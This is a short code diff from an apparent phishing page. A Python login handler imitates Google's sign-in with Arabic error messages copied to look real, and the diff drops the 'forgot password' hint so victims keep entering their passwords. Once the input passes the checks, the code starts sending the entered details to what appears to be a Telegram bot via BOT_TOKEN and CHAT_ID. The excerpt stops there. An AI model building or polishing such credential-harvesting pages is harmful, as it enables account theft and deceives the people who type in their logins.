@@ -24,16 +24,13 @@ def login():
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
-    # رسائل خطأ واقعية مطابقة لجوجل
+    # الشروط ورسائل الخطأ الواقعية بدون جملة نسيت كلمة المرور
     if not (
         re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
       error = "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد الإلكتروني."
     elif len(password) <= 6:
-      error = (
-          "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة أو النقر على 'هل نسيت"
-          " كلمة المرور؟' لإعادة تعيينها."
-      )
+      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
